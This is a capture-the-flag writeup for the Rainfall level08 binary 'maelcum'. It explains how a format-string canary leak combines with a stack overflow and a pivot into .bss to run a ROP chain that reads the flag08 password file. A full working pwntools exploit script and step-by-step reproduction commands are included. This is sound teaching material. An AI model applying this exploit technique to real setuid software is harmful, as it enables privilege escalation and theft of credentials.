# Rainfall — level08 (`maelcum`) — Writeup

## Target

```
-rwsr-x--- 1 flag08 level08 ... maelcum
```

- Setuid binary, owned by `flag08`, executable by `level08`
- `x86-64`, dynamically linked, not stripped
- Goal: escalate from `level08` to `flag08`

### Protections (`checksec`)

```
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

No PIE + ASLR disabled on the host (`cat /proc/sys/kernel/randomize_va_space`
→ `0`) means every address is stable across runs. The stack canary is the
only real obstacle, and — unlike level03/04 — this time it has to be
defeated rather than simply avoided, because the vulnerable function
genuinely overflows the stack.

---

## The source

```c
struct Route {
    int id;
    int metric;
    char src[16];
    char dst[16];
};

struct Route routing_table[8];   // 0x4040a0
int route_count;                 // 0x4041e0
char relay_buf[512];             // 0x404200  <-- a big, predictable .bss buffer
int relay_len;                   // 0x404400

void relay_status(void) {
    char buf[64];
    ...
    bytes_read = read(0, buf, 63);
    buf[bytes_read] = '\0';
    buf[strcspn(buf, "\n")] = '\0';

    printf("[MAELCUM] Logging relay tag: ");
    printf(buf);                 // <-- format string bug, same class as level04
    putchar('\n');
}

void relay_data(void) {
    char cmd_buf[48];
    unsigned int len;

    read(0, cmd_buf, 64);        // <-- reads 64 bytes into a 48-byte buffer!

    if (strncmp(cmd_buf, "RELAY:", 6) == 0) {
        len = (unsigned int)strtoul(cmd_buf + 6, NULL, 10);
        if (len > 0x1ff)         // 511
            return;

        printf("[MAELCUM] Ready for %u bytes: ", len);
        relay_len = read(0, relay_buf, len);   // attacker controls len, up to 511
        printf("[MAELCUM] Relayed %u bytes.\n", relay_len);
    }
}
```

`main()` calls, in order: `init_routing() → print_banner() → add_route() ×2
→ relay_status() → relay_data() → print_routes()`.

This level combines **two** bugs that have to work together:

1. **A format string vulnerability** in `relay_status()` — same class of bug
   as `riviera` (level04). Used here purely as an **information leak**, to
   read the stack canary.
2. **A classic stack buffer overflow with a canary** in `relay_data()` —
   `read(0, cmd_buf, 64)` into a 48-byte buffer. Unlike level03's `armitage`,
   this one is protected by a canary, so the overflow has to *reproduce* the
   canary value rather than just smash straight through it.

---

## Step 1 — leak the canary

### Finding the buffer offset

```
sub $0x40, %rsp              ; cmd_buf's frame is 0x40 (64) bytes
lea -0x30(%rbp), %rax        ; cmd_buf itself starts at rbp-0x30 (48 bytes below rbp)
```

So the layout from `cmd_buf`'s start is:

```
[ cmd_buf[0..47] ]   48 bytes
[ canary ]           8 bytes   (at offset 48 / 0x30)
[ saved rbp ]        8 bytes   (at offset 56 / 0x38)
[ return address ]   8 bytes   (at offset 64 / 0x40)
```

`read(0, cmd_buf, 64)` happily reads past `cmd_buf`'s 48 bytes and all the
way up to (but not including) the return address — enough to overwrite the
canary and the saved `rbp`, but critically **not** the return address
itself in a single read. (The actual privilege-escalation write happens
later, via the stack pivot — see Step 3.)

### Leaking it

The canary is a single, process-wide value (stored at `%fs:0x28` and copied
onto every function's stack frame at entry), so leaking it from
`relay_status()`'s frame gives the exact same value `relay_data()` will
later check against.

```
Tag this relay (who's asking?): %14$p.%15$p.%16$p.%17$p.%18$p
```

Scan the results for whichever value's **lowest byte is `00`** — that's the
canary's signature (the kernel always zeroes it, to block naive string-based
leaks like `puts`/`%s` from reading past it). Confirmed here at position
`%17$p`.

---

## Step 2 — the privilege escalation plan

We want `flag08`'s access, without ever spawning an interactive shell (which,
as seen in earlier levels, tends to drop privilege on startup if `ruid !=
euid`). Instead, the plan is a **pure syscall chain**:

```
setreuid(1025, 1025)              ; 1025 = flag08's UID
open("/home/flag08/.pass", O_RDONLY)
read(fd, buffer, 32)
write(1, buffer, 32)              ; print it straight to our own stdout
exit(3)
```

No shell anywhere in this chain, so there's nothing to drop privilege — the
read and write happen directly under our own already-flag08-privileged
process.

---

## Step 3 — getting there: a stack pivot into `.bss`

`relay_data()`'s overflow only gives **16 extra bytes** of control beyond the
canary (the saved `rbp` and the return address) — nowhere near enough room
for a real ROP chain. But the same function also offers a second,
much bigger primitive: it reads up to **511 attacker-controlled bytes**
straight into `relay_buf`, a fixed `.bss` address (`0x404200`) with no
ASLR/PIE to worry about.

The fix is the same pivot technique from `riviera` (level04), just
triggered by a classic overflow instead of a format-string `%n` write:

```
[cmd_buf 'A' padding]
[canary]              <- must match exactly, or __stack_chk_fail aborts
[saved rbp]  = 0x404200              <- corrupted to point into relay_buf
[return addr] = leave;ret gadget     <- borrowed from the binary's own code
```

When `relay_data()`'s real epilogue runs:
```asm
leave   ; rbp = 0x404200 (corrupted)   ; rsp = old-rbp-slot-address
ret     ; rip = our borrowed leave;ret gadget
```
That borrowed gadget immediately fires again:
```asm
leave   ; rsp = rbp = 0x404200   <- now pointing INTO relay_buf!
ret     ; rip = whatever's stored at relay_buf+8
```
From here, `rsp` walks through `relay_buf` — which we've already filled
(via the earlier `"RELAY:511..."` read) with a full ROP chain.

### The payload has three regions, packed into the 511-byte `relay_buf` write

```
bytes   0 .. 447   ROP chain (setreuid, open, read, write, exit)
bytes 448 .. 479   the filename string: "/home/flag08/.pass\0"
bytes 480 .. 510   a small scratch buffer the chain reads the flag into
```

The `open()` call in the chain is pointed at offset 448 (the filename
region); the `read()`/`write()` calls are pointed at offset 480 (the scratch
buffer). Laying out data and code in the same writable region like this is
only possible because NX doesn't block *reading/writing* `.bss` — it only
blocks *executing* it, and we're never executing anything there, only
chaining `ret`-to-`ret` through return addresses that each point into libc.

---

## A gadget pitfall worth knowing about

x86-64's calling convention needs `rdi`, `rsi`, and `rdx` set for a 3-argument
call like `open()`/`read()`/`write()`. Clean `pop rdi; ret` and `pop rsi; ret`
gadgets are usually easy to find, but **a standalone `pop rdx; ret` is often
missing entirely** from glibc — there's rarely a code path that pops *only*
`rdx` before returning.

The instinct to just invent one (e.g. assembling `mov rdx, rbx; ...` from
scratch and searching libc for those exact bytes) doesn't work — those bytes
almost certainly don't exist anywhere in the real file, and even the
assembly itself can fail to generate cleanly in isolation (ambiguous operand
sizes without surrounding context).

The reliable fix is to **search for what's actually there**:

```bash
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rdx"
```

This turns up a long tail of compound gadgets — leftover fragments of real
function epilogues. The one that worked here:

```
pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
```

It sets `rdx` correctly; the extra `pop`s just need harmless junk values
(`0`) to keep the stack aligned for whatever comes next. This exact pattern
also showed up in level04's libc — it's a common enough shape that it's
worth checking for by name whenever a clean `pop rdx; ret` doesn't exist.

---

## Exploit script

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = 0x7ffff7c00000

rop = ROP(libc, badchars=b'\n')

BSS_BUFFER_ADDRESS = 0x404200
FILE_ADDRESS = 0x4043c0        # BSS_BUFFER_ADDRESS + 448
BUFFER_ADDRESS = 0x4043d8      # BSS_BUFFER_ADDRESS + 448 + 32
BUFFER_SIZE = 32
O_RDONLY = 0
OWNER_UID = 1025
FD = 3
STDOUT = 1

ROP_POP_RDX = p64(libc.address + 0xb513c)   # pop rdx ; xor eax,eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
ROP_LEAVE   = p64(rop.find_gadget(['leave', 'ret'])[0])


def set_3args(rdi_val, rsi_val, rdx_val):
    rop.raw(rop.rdi)
    rop.raw(rdi_val)
    rop.raw(rop.rsi)
    rop.raw(rsi_val)
    rop.raw(ROP_POP_RDX)
    rop.raw(rdx_val)
    rop.raw(0)   # junk -> rbx
    rop.raw(0)   # junk -> r12
    rop.raw(0)   # junk -> r13
    rop.raw(0)   # junk -> rbp


rop.setreuid(OWNER_UID, OWNER_UID)
rop.open(FILE_ADDRESS, O_RDONLY)
set_3args(FD, BUFFER_ADDRESS, BUFFER_SIZE)
rop.raw(libc.symbols['read'])
set_3args(STDOUT, BUFFER_ADDRESS, BUFFER_SIZE)
rop.raw(libc.symbols['write'])
rop.exit(3)

assert len(rop.chain()) < 440, "ROP chain too long -- will overwrite the filename region"

canary_idx = b'%17$p'

p = process('/home/level08/maelcum', env={})

p.recvuntil(b"[MAELCUM] Tag this relay (who's asking?): ")
p.sendline(canary_idx)
canary_string = p.recvline().strip()[len(b"[MAELCUM] Logging relay tag: "):]
canary = int(canary_string, 16)

magic = b'RELAY:' + b'511' + b'X' * 31 + p64(canary) + p64(BSS_BUFFER_ADDRESS) + ROP_LEAVE

p.recvuntil(b"[MAELCUM] Send it: ")
p.send(magic)
p.recvuntil(b'[MAELCUM] Ready for 511 bytes: ')

payload = p64(0) + rop.chain()
payload += b'\x00' * (448 - len(payload))
payload += b"/home/flag08/.pass" + b'\x00' * 6
payload += b'\x00' * (511 - len(payload))
p.sendline(payload)

print(p.recvall(timeout=2))
```

---

## Steps to reproduce

1. **Recon**
   ```bash
   checksec maelcum
   cat /proc/sys/kernel/randomize_va_space
   ldd maelcum
   ```

2. **Confirm the format string bug and find the canary position**
   ```
   Tag this relay (who's asking?): %14$p.%15$p.%16$p.%17$p.%18$p
   ```
   Look for the value whose low byte is `00`.

3. **Confirm the overflow offset** in `relay_data()` by disassembling it —
   frame size and the buffer's `lea` offset give the exact distance to the
   canary (48 bytes here), and canary+saved-rbp+return-address follow in
   the usual 8-byte slots after that.

4. **Confirm `relay_buf`'s real address**
   ```bash
   nm maelcum | grep relay_buf
   ```

5. **Find the libc gadgets needed** (`pop rdi`, `pop rsi`, a working `pop
   rdx` equivalent, `leave;ret` inside the binary, and the `open` / `read`
   / `write` / `setreuid` / `exit` symbols) — let `pwntools.ROP()` and
   `libc.symbols[...]` resolve most of these automatically; only the
   compound `pop rdx` gadget needs manual searching.

6. **Build and run the exploit** (script above).

---

## Key lessons / pitfalls hit along the way

- **Two bug classes can combine.** A format-string leak in one function
  and a canary-protected overflow in a different function become solvable
  together, because the stack canary is a single process-wide value, not
  per-function — leaking it anywhere is as good as leaking it everywhere.
- **A canary doesn't block an overflow — it just requires reproducing the
  correct value in the right position.** `gets()`/large `read()` overflows
  still work fine as long as the attacker supplies the real canary bytes at
  the right offset before continuing into the saved rbp/return address.
- **A small, fixed `.bss` buffer under attacker control is a powerful
  pivot target**, especially when the function-local overflow itself is
  too short to carry a full ROP chain. Corrupting the saved RBP/return
  address to redirect through a `leave;ret` gadget (whether triggered by a
  `%n` write or, as here, a plain overflow) turns a tiny, cramped overflow
  into effectively unlimited working space.
- **Don't invent gadgets — search for them.** An assembled-from-scratch
  instruction sequence is very unlikely to exist verbatim anywhere in a
  real libc, and may not even assemble cleanly on its own. When a clean
  single-purpose gadget (like `pop rdx; ret`) is missing, search broadly
  (`ROPgadget ... | grep`) for a compound gadget that achieves the same
  effect with a few extra, harmless pops.
- **Avoid spawning a shell when a direct syscall chain will do.** A
  `setreuid` → `open` → `read` → `write` → `exit` chain reads and prints the
  flag without ever creating a child process — sidestepping entirely the
  "shell drops privilege on startup" problems seen in earlier levels.
- **Keep the chain's length under control.** When code and data share the
  same writable buffer (ROP chain + filename + scratch space all packed
  into one `.bss` region), the chain must stay short enough not to spill
  into the data that follows it — worth asserting on `len(rop.chain())`
  rather than discovering the overlap through a silent, empty result.
